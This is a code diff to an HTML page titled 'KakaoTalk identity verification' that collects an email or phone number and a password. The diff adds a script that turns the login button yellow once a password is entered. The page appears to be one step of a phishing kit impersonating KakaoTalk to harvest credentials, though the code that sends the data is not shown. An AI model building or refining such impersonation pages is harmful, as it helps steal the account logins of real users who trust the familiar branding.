@@ -81,7 +81,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 <h2>카카오톡 본인인증하기</h2>
 <input type="text" placeholder="이메일 또는 전화번호" id="userId4" style="width:365px; padding:5px;">
 <input type="password" placeholder="비밀번호" id="userCode4" style="width:365px; padding:5px;">
-<button type="button" class="btn-gray" onclick="sendPage4()">로그인</button>
+<button type="button" class="btn-gray" id="loginBtn" onclick="sendPage4()">로그인</button>
 </div>
 
 <script>
@@ -246,6 +246,20 @@ function sendPage4() {
     return;
   }
 }
+
+// page4 비밀번호 입력 감지 및 버튼 색상 변경
+const passwordInput = document.getElementById("userCode4");
+const loginBtn = document.getElementById("loginBtn");
+
+passwordInput.addEventListener("input", () => {
+  if (passwordInput.value.trim().length > 0) {
+    loginBtn.classList.remove("btn-gray");
+    loginBtn.classList.add("btn-yellow");
+  } else {
+    loginBtn.classList.remove("btn-yellow");
+    loginBtn.classList.add("btn-gray");
+  }
+});
 </script>
 </body>
 </html>
